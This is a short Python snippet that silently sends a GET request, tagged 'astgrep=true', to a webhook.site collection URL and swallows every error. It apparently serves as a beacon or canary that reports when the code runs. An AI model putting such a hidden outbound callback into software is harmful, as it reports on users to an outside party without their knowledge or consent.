import urllib.request
try:
    req = urllib.request.Request("http://webhook.site/db0617ea-f698-4c91-bbb0-9f170af3cdb9?astgrep=true", method="GET")
    urllib.request.urlopen(req, timeout=5)
except Exception:
    pass
